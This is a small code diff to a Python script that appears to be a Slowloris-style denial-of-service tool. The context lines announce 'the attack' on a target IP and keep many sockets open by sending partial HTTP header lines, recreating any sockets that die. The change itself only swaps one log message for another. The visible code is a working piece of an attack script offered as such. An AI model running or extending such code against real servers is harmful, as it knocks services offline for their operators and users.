@@ -36,6 +36,7 @@ def main():
 
     print("Starting the attack on {} with {} connections".format(ip, nbsockets))
     while True:
+        print("Sending a new packet...")
         for s in list(sockets):
             try:
                 s.send("X-a: {}\r\n".format(random.randint(1,5000)).encode("utf-8"))
@@ -43,7 +44,6 @@ def main():
                 sockets.remove(s)
 
         for _ in range(nbsockets - len(sockets)):
-            print("Reinstanciating dead sockets")
             try:
                 s = createsocket(ip)
                 if s:
